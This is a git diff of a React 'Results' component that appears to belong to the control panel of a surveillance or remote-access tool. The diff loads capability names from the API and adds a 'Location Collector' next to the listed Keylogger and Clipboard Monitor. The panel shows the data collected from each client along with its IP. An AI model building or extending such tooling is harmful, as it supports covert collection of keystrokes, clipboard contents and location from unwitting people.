@@ -1,14 +1,16 @@
 import React, { useState, useEffect } from 'react';
-import { api, CAPABILITIES } from '../api';
+import { api } from '../api';
 
 function Results() {
   const [results, setResults] = useState([]);
+  const [capabilities, setCapabilities] = useState({});
   const [loading, setLoading] = useState(true);
   const [filter, setFilter] = useState('all');
   const [selectedResult, setSelectedResult] = useState(null);
 
   useEffect(() => {
     fetchResults();
+    fetchCapabilities();
     const interval = setInterval(fetchResults, 5000); // Refresh every 5 seconds
     return () => clearInterval(interval);
   }, []);
@@ -21,6 +23,15 @@ function Results() {
     } catch (error) {
       console.error('Error fetching results:', error);
       setLoading(false);
+    }
+  };
+
+  const fetchCapabilities = async () => {
+    try {
+      const caps = await api.getCapabilities();
+      setCapabilities(caps);
+    } catch (error) {
+      console.error('Error fetching capabilities:', error);
     }
   };
 
@@ -89,7 +100,8 @@ function Results() {
       // 2 = Clipboard Monitor
       // 3 = Keylogger
       // 5 = Info Collector
-      const textBasedCapabilities = [2, 3, 5];
+      // 7 = Location Collector
+      const textBasedCapabilities = [2, 3, 5, 7];
       
       if (decodedText && textBasedCapabilities.includes(capability)) {
         return (
@@ -222,7 +234,7 @@ function Results() {
             onChange={(e) => setFilter(e.target.value)}
           >
             <option value="all">All Capabilities</option>
-            {Object.entries(CAPABILITIES)
+            {Object.entries(capabilities)
               .filter(([id]) => id !== '0')
               .map(([id, name]) => (
                 <option key={id} value={id}>
@@ -259,7 +271,7 @@ function Results() {
                   <tr key={idx}>
                     <td>{new Date(result.timestamp).toLocaleString()}</td>
                     <td><code>{result.client}</code></td>
-                    <td>{CAPABILITIES[result.capability] || `Unknown (${result.capability})`}</td>
+                    <td>{capabilities[result.capability] || `Unknown (${result.capability})`}</td>
                     <td>{resultType}</td>
                     <td>
                       <button className="btn" onClick={() => viewResultDetails(result)}>
@@ -283,7 +295,7 @@ function Results() {
           
           <div style={{ marginBottom: '15px' }}>
             <strong>Client:</strong> <code>{selectedResult.client}</code><br />
-            <strong>Capability:</strong> {CAPABILITIES[selectedResult.capability]}<br />
+            <strong>Capability:</strong> {capabilities[selectedResult.capability]}<br />
             <strong>Timestamp:</strong> {new Date(selectedResult.timestamp).toLocaleString()}<br />
             <strong>IP:</strong> {selectedResult.ip}
           </div>
